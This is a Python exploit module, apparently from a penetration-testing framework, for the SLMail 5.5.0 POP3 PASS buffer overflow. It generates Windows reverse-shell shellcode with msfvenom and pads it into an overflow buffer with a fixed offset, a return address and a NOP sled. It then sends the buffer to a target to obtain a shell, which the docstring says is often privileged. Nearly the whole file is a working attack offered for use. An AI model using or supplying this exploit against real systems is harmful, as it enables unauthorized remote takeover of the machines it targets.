"""
SLMail 5.5.0 Buffer Overflow Exploit

Exploits the SLMail 5.5.0 PASS buffer overflow to gain a reverse shell on the service system.
This shell is often admin as SLMail must be controlled with a system or high privileged user.

"""

import subprocess, socket

class Module:
    """
    Module Class
    """

    __title__ = 'exploit.slmail_550'
    __date__ = '2018-02-02'
    __rank__ = 'normal'
    __description__ = 'Exploits the SLMail 5.5.0 PASS buffer overflow to gain a reverse shell'

    __author__ = 'Example'

    def __init__(self, RHOST=None, RPORT=110, LHOST=None, LPORT=4444):
        """
        __init__(self, RHOST=None, RPORT=110, LHOST=None, LPORT=4444)

        :param RHOST:
        :param RPORT:
        :param LHOST:
        :param LPORT:

        Initialize the module with the module's desired options
        """
        self.__dict__['RHOST'] = {"value": RHOST, "required": True, "description": "Remote host"}
        self.__dict__['RPORT'] = {"value": RPORT, "required": True, "description": "Remote port"}
        self.__dict__['LHOST'] = {"value": LHOST, "required": True, "description": "Local host"}
        self.__dict__['LPORT'] = {"value": LPORT, "required": True, "description": "Local port"}

    def run(self):
        """
        run(self)

        :return:

        Run the module
        """
        if self.RHOST['value'] and self.RPORT['value'] and self.LHOST['value'] and self.LPORT['value']:
            shellcode = subprocess.check_output('msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} '.format(
                self.LHOST['value'], self.LPORT['value']) +
                                                'EXITFUNC=thread -f raw -a x86 --platform windows -b "\\x00\\x0a\\x0d"' +
                                                ' -e x86/shikata_ga_nai', shell=True)

            buffer = ("A" * 2606).encode('utf-8') + ("\x8f\x35\x4a\x5f").encode('utf-8') + \
                     ("\x90" * 16).encode('utf-8') + shellcode + \
                     ("C" * (3500 - 2606 - 4 - 351 - 16)).encode('utf-8')

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            try:
                print("\nSending evil buffer...")
                s.connect((self.RHOST['value'], int(self.RPORT['value'])))
                data = s.recv(1024)
                s.send('USER test'.encode('utf-8') + '\r\n'.encode('utf-8'))
                data = s.recv(1024)
                s.send('PASS '.encode('utf-8') + buffer + '\r\n'.encode('utf-8'))
                print("\nDone!.")
            except:
                print("Could not connect to POP3!")
        else:
            print("You are missing required module options. Please see: show options")

